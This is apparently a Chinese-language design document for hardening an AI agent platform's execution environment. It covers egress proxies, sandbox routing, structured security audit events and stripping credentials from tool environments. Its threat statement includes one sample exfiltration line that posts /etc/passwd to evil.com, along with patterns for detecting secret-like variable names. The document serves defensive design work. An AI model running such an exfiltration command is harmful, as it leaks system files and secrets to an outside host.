## Context — 背景

Hecate 的 Agent 执行环境存在四个关键的安全漏洞，这些漏洞通过对 15+ 个平台（Bedrock AgentCore、Claude Code、Codex CLI、Dify、Google Vertex AI、Salesforce Agentforce、Palantir AIP、IBM watsonx、AgentScope、华为 AgentArts、DeerFlow、OpenClaw、Hermes Agent、openjiuwen）的行业研究识别出。现有的安全栈（`ToolPolicyPipeline` 5 层 + `ToolAccessPolicy` 5 层 + `WorkspaceBoundaryPolicy` + `ApprovalCallback`）提供了健壮的工具级访问控制，但缺少环境级的执行：

1. **无网络出站控制**：DockerEnvironment 容器具有不受限制的网络访问权限。Agent 可以通过 `requests.post("https://evil.com", data=open("/etc/passwd").read())` 窃取数据，没有任何阻止机制。
2. **沙箱路由未强制实施**：`ToolAccessPolicy.evaluate()` 返回 `EXECUTE_SANDBOX`，但 `ToolWorker` 将其与 `EXECUTE` 同等对待 — `ToolInfo` 上的 `sandbox_enabled` 标志仅作为信息参考。
3. **审计事件非结构化**：安全决策通过散布在 `policy_pipeline.py`、`tool_access.py` 和 `tool_worker.py` 中的 `logger.debug()` 调用进行日志记录。不存在可查询的结构化审计线索。
4. **凭证全局可见**：所有工具继承完整的进程环境，包括 `DATABASE_URL`、`LLM_API_KEY`、`SECRET_KEY` 和任何其他机密。任何工具都可以读取任何机密。

**现有架构约束**：
- `AgentEnvironment` 是一个具有 `LocalEnvironment` 和 `DockerEnvironment` 实现的 ABC
- `EnvironmentManager` 维护一个用于复用的 Docker 容器热池
- `ToolPolicyPipeline` 有两个拦截点：`evaluate_visibility()`（LLM 上下文过滤）和 `evaluate_execution()`（运行时访问决策）
- `ToolAccessPolicy` 返回 `AccessDecision` 枚举：`EXECUTE`、`EXECUTE_SANDBOX`、`REQUIRE_APPROVAL`、`DENY`
- 引擎层（`engine/`）对 `services/` 或 `models/` 零依赖（`checkpoint.py` 遗留问题除外）
- `SecurityError` 存在于统一异常层次结构中（`1.3.5g`）

## Goals / Non-Goals — 目标 / 非目标

**目标：**
- 以最小的现有 Agent 干扰方式关闭四个 P0 安全漏洞
- 所有新功能默认向后兼容（行为变更需选择加入）
- 结构化的审计管道在 LocalEnvironment 和 DockerEnvironment 上都工作
- 网络出站控制、沙箱强制实施和凭证范围限定仅在 DockerEnvironment 上工作
- 设计为未来的 9.16（外部策略引擎）和 9.17（AI 自动批准）奠定基础

**非目标：**
- 外部策略引擎集成（Cedar/OPA）— 推迟到 9.16（P4）
- AI 驱动的自动批准 — 推迟到 9.17（P4）
- Firecracker microVM / WASM 后端 — 推迟到 6.40/6.41（P5）
- 出站 DLP 引擎 — 推迟到 9.10（单独的 P3 变更）
- Agent 运行时行为保护 — 推迟到 9.11（单独的 P3 变更）
- SIEM 导出管道 — 推迟到 8.7 SS5（单独的 P3 变更，消费 9.14 事件）
- LocalEnvironment 网络隔离或凭证隔离 — 记录为仅开发环境的限制
- 每个工具的 OAuth token 生命周期管理 — 在连接器层面由 5.8 TP6 覆盖

## Decisions — 决策

### D1：网络出站默认策略 — 可配置，向后兼容默认

**决策**：新配置 `AGENT_ENV_NETWORK_POLICY=allow_all|deny_all`，默认 `allow_all`。

**理由**：默认 `deny_all` 会破坏所有隐含依赖容器网络访问（pip install、API 调用、网络抓取）的现有 Agent。`allow_all` 保持向后兼容性；管理员通过显式的 `allowedDomains` 配置选择加入 `deny_all`。

**考虑的替代方案**：
- 默认 `deny_all`（安全优先）：拒绝 — 升级时会破坏所有现有 Agent
- 仅每 Agent 策略（无全局默认）：拒绝 — 对于初始发布来说粒度太细，全局配置加每 Agent 覆盖更简单

**每 Agent 覆盖**：Agent 配置可以包含 `network_policy` 字段，覆盖全局默认值。如果 Agent 级策略是 `deny_all`，则无论全局设置如何，该 Agent 的容器都会获得受限的网络命名空间。

### D2：网络隔离机制 — Docker 自定义网络 + 出站代理

**决策**：使用 Docker 自定义桥接网络，每个工作空间（同一工作空间中的 Agent 共享）带一个出站代理容器（Squid 或轻量级 HTTP CONNECT 代理）。

**架构**：
```
Agent 容器 ──(内部网络，无互联网)──→ 出站代理容器 ──(外部网络)──→ 互联网
```

- 每个工作空间最多有一个出站代理容器（懒创建、热池）
- Agent 容器连接到仅内部网络的 Docker 网络（无 `--gateway` 到互联网）
- 出站代理具有从工作空间 + Agent 策略派生的 `allowedDomains`/`deniedDomains` 配置
- 代理将所有请求记录到结构化审计管道（9.14）

**理由**：这是 Dify（Squid 代理 + SSRF_PROXY_NET）使用的经过验证的方法。它提供域级控制，而无需主机上的 root 权限或 iptables 操作。K8s 部署则使用原生 NetworkPolicy + Egress 资源。

**考虑的替代方案**：
- 容器网络命名空间上的 iptables/netfilter：拒绝 — 需要 `CAP_NET_ADMIN`，脆弱，依赖主机内核版本
- Docker `--network none` + 进程内应用级代理：拒绝 — 会破坏使用原始套接字或非 HTTP 协议的工具
- 仅 DNS 级过滤：拒绝 — 可通过直接 IP 连接绕过

### D3：审计事件存储 — 新的 ORM 表，带异步批量写入

**决策**：新的 `SecurityAuditModel` SQLAlchemy 表，带内存异步批量写入器（缓冲区 → 每 50 个事件或 5 秒刷新一次，以先到者为准）。

**模式**：
```python
class SecurityAuditModel(Base):
    __tablename__ = "security_audit_events"
    id: Mapped[UUID]  # 主键
    agent_id: Mapped[str]  # 已索引
    workspace_id: Mapped[str]  # 已索引
    session_id: Mapped[str | None]  # 可空
    tool_name: Mapped[str]
    arguments_hash: Mapped[str]  # 参数的 SHA-256（非原始，为 PII 安全）
    decision: Mapped[str]  # AccessDecision.value 或 PolicyDecision.value
    reason: Mapped[str]
    policy_version: Mapped[str]  # 有效策略配置的哈希
    on_behalf_of_user: Mapped[str | None]  # 可空
    timestamp: Mapped[datetime]  # 已索引
    layer_results: Mapped[list[dict]]  # JSON — 每层决策分解
```

**理由**：专用表实现带过滤和聚合的 REST 查询 API。异步批量写入摊销 I/O 成本 — 以每分钟 100 次工具调用、每次 5 层计算，即每分钟 500 个事件，完全在批量写入能力范围内。`arguments_hash` 存储哈希（而非原始参数），以避免 PII 泄露到审计日志中。

**保留期**：通过 `AGENT_ENV_AUDIT_RETENTION_DAYS`（默认 30）可配置。定期清理任务删除早于保留窗口的行。

**考虑的替代方案**：
- EventStore（现有基础设施）：拒绝 — EventStore 设计用于 Pregel channel 事件，而非安全审计；查询语义不匹配
- 仅追加的 JSONL 日志文件：拒绝 — 无外部工具无法查询
- 每个事件直接写入（无批处理）：拒绝 — 高吞吐量下数据库压力过大

### D4：凭证剥离范围 — 模式 + 前缀 + 白名单

**决策**：三层凭证检测：

1. **模式匹配**：匹配 `*_KEY`、`*_SECRET`、`*_TOKEN`、`*_PASSWORD`、`*_API_KEY`、`*_PWD` 的变量被剥离
2. **前缀标记**：前缀为 `HECATE_SECRET_*` 的变量始终被剥离
3. **自定义模式**：工作空间配置可以添加自定义正则模式
4. **系统白名单**（始终保留）：`PATH`、`HOME`、`LANG`、`LC_*`、`TMPDIR`、`USER`、`SHELL`、`HOSTNAME`、`TERM`、`PWD`

**剥离机制**：当 `AGENT_ENV_CREDENTIAL_SCOPING=true` 且工具即将在 DockerEnvironment 中执行时：
1. 为工具子进程构建环境变量字典
2. 移除所有匹配剥离模式的变量
3. 仅注入工具的 `CredentialScope` 凭证（如果已配置）或不注入凭证（如果未配置）
4. 使用清理后的环境执行工具

**理由**：模式匹配捕获绝大多数机密命名约定，无需手动标记。前缀为非常规名称提供显式选择加入。白名单防止破坏基本系统功能。

**考虑的替代方案**：
- 剥离所有环境变量（仅白名单）：拒绝 — 会破坏需要 PATH、HOME、LANG 的工具
- 仅显式标记（无模式）：拒绝 — 太容易忘记标记机密

### D5：沙箱强制实施路由 — 基于 ToolWorker 决策的分发

**决策**：`ToolWorker` 获得一个 `SandboxEnforcementRouter`，检查 `ToolAccessPolicy.evaluate()` 的 `AccessDecision` 并相应路由：

| 决策 | 路由 | 适用范围 |
|----------|---------|------------|
| `EXECUTE` | 直接执行（当前行为） | 所有工具 |
| `EXECUTE_SANDBOX` | 通过 `DockerEnvironment.exec_shell()` 路由 | Shell/exec 工具 + `sandbox_enabled` MCP 工具 |
| `REQUIRE_APPROVAL` | 现有的 ApprovalCallback 流程（不变） | 所有工具 |
| `DENY` | 立即阻止（不变） | 所有工具 |

**工具类别**：
- **Shell/exec 工具**（`bash`、`exec_shell`、`execute_code`）：`EXECUTE_SANDBOX` → 在 DockerEnvironment 容器内运行
- **`sandbox_enabled=True` 的 MCP 工具**：`EXECUTE_SANDBOX` → 在容器内运行（MCP 服务器在容器内运行）
- **Python 内置工具**（`read_file`、`write_file` 等）：`EXECUTE_SANDBOX` → 无操作（已由 WorkspaceBoundaryPolicy 管理，不路由到容器）

**容器退出验证**：`exec_shell()` 完成后，检查 `proc.returncode`。如果容器进程异常退出（例如被 OOM 杀死、段错误），发出 `decision="sandbox_anomaly"` 的 `SecurityAuditEvent` 并记录 WARNING。

**配置失效**：EnvironmentManager 为每个 Agent 存储 `security_config_hash`。当 Agent 安全配置更改（网络策略、凭证范围、沙箱强制实施）时，哈希更改，该 Agent 的热池容器被标记为失效（销毁，不复用）。

**考虑的替代方案**：
- 在 `EXECUTE_SANDBOX` 时将所有工具路由到沙箱：拒绝 — Python 函数工具无法在没有 RPC 机制的情况下"在容器内"执行；当前工具是进程内函数
- 独立于 `EXECUTE_SANDBOX` 的新 `EXECUTE_CONTAINER` 决策：拒绝 — 重载现有决策更简单且向后兼容

### D6：功能标志 — 每功能独立配置，带安全默认值

**决策**：每个子功能有独立的配置标志：

| 配置 | 默认值 | 理由 |
|--------|---------|-----------|
| `AGENT_ENV_NETWORK_POLICY` | `allow_all` | 向后兼容 |
| `AGENT_ENV_AUDIT_ENABLED` | `true` | 低风险 — 仅观察 |
| `AGENT_ENV_AUDIT_RETENTION_DAYS` | `30` | 合理的默认值 |
| `AGENT_ENV_CREDENTIAL_SCOPING` | `false` | 向后兼容 |
| `AGENT_ENV_SANDBOX_ENFORCEMENT` | `false` | 向后兼容 |

**理由**：独立标志允许增量部署。审计管道（风险最低）默认开启；行为变更（网络、凭证、沙箱）默认关闭。管理员在准备就绪时逐个启用。

### D7：LocalEnvironment 范围 — 仅审计，记录为仅开发环境

**决策**：仅 9.14（结构化审计管道）适用于 LocalEnvironment。其他三个功能（9.12、9.13、9.15）仅限 DockerEnvironment。

**当 `AGENT_ENV_BACKEND=local` 时**：
- 9.14 审计：✅ 工作（纯软件，无容器依赖）
- 9.12 网络：⚠️ 记录警告 "Network egress control not available on LocalEnvironment"
- 9.13 沙箱：⚠️ 记录警告 "Sandbox enforcement not available on LocalEnvironment"
- 9.15 凭证：⚠️ 记录警告 "Credential scoping not available on LocalEnvironment"

**理由**：LocalEnvironment 在主机文件系统上运行，使用主机的网络栈。在主机上实施网络隔离或沙箱强制需要 iptables/root 权限，并存在影响主机系统的风险。LocalEnvironment 被记录为"仅开发环境，不用于生产"。

### D8：审计事件发射点 — 策略管道 + 工具访问 + 沙箱路由器

**决策**：`SecurityAuditEvent` 在执行管道的三个点发射：

1. **ToolPolicyPipeline.evaluate_visibility()** — 每个工具每层发出事件（决策：HIDE/DENY/ALLOW）
2. **ToolPolicyPipeline.evaluate_execution()** — 发出具有最终决策 + 每层分解的事件
3. **ToolAccessPolicy.evaluate()** — 发出具有 AccessDecision + 匹配规则的事件
4. **SandboxEnforcementRouter** — 在路由到沙箱或检测到异常时发出事件

**发射机制**：一个新的 `SecurityAuditEmitter` 类（在 `engine/` 中）将事件收集到异步缓冲区中。缓冲区通过服务层的 `SecurityAuditService` 刷新到 `SecurityAuditModel`。引擎层不直接从 models/services 导入 — 事件通过 `AuditSink` ABC 流动（类似 `EnginePort` 模式）。

**考虑的替代方案**：
- 仅在最终决策点发射：拒绝 — 丢失了合规所需的每层审计跟踪
- 通过 Python 日志记录发射（结构化日志记录）：拒绝 — 将审计耦合到日志框架，无查询 API

## Risks / Trade-offs — 风险 / 权衡

### [R1] 出站代理为每个出站请求增加延迟
**缓解**：代理是每工作空间（共享）的，而非每 Agent。典型增加延迟：HTTP CONNECT 小于 5ms。代理具有连接池。如果 `AGENT_ENV_NETWORK_POLICY=allow_all`（默认），则根本不使用代理。

### [R2] 审计批量写入器在崩溃时可能丢失事件
**缓解**：缓冲区刷新间隔最多 5 秒。在优雅关闭时，缓冲区被刷新。在崩溃时，最多丢失 5 秒的事件。这对安全审计（不是事务性日志记录）是可接受的。未来的增强：预写日志以实现零丢失。

### [R3] 凭证剥离可能破坏从环境变量读取机密信息的工具
**缓解**：默认值为 `false`。启用后，工具的 `CredentialScope` 配置显式列出它接收的凭证。没有配置 scope 的工具使用清理后的环境运行（无机密）。如果工具需要特定机密，管理员在 scope 中配置。

### [R4] 配置变更时热池容器失效导致冷启动延迟
**缓解**：配置变更是低频的（管理操作，不是每个请求）。冷启动时间约 2-3 秒用于 Docker 容器创建。热池异步重新填充。

### [R5] 每工作空间的 Docker 自定义网络增加 Docker 网络数量
**缓解**：Docker 支持数千个网络。工作空间删除时进行清理。懒创建（仅当工作空间中的 Agent 首次需要网络策略时）。

### [R6] 基于模式的凭证检测可能遗漏非常规机密名称
**缓解**：工作空间级别的自定义模式 + `HECATE_SECRET_*` 前缀用于显式标记。记录的最佳实践：对所有机密使用前缀。

## Migration Plan — 迁移计划

### 部署步骤（零停机）
1. 部署新代码 — 所有功能默认使用向后兼容的值
2. （可选）启用 `AGENT_ENV_AUDIT_ENABLED=true` — 审计事件开始流动（无行为变更）
3. （可选，每 Agent）在特定 Agent 上配置 `network_policy`、`credential_scope`
4. （可选）为生产工作空间启用 `AGENT_ENV_NETWORK_POLICY=deny_all`
5. （可选）启用 `AGENT_ENV_CREDENTIAL_SCOPING=true` 和 `AGENT_ENV_SANDBOX_ENFORCEMENT=true`

### 回滚
- 将所有 `AGENT_ENV_*` 安全标志设置为默认值（`allow_all`、`true`、`false`、`false`）
- 无需数据库迁移 — `SecurityAuditModel` 表可以保留（无害）
- 无数据丢失 — 所有现有 Agent 配置不变

## Open Questions — 开放问题

所有 7 个设计问题已在提案阶段与用户一起解决。没有待处理的未解决问题。
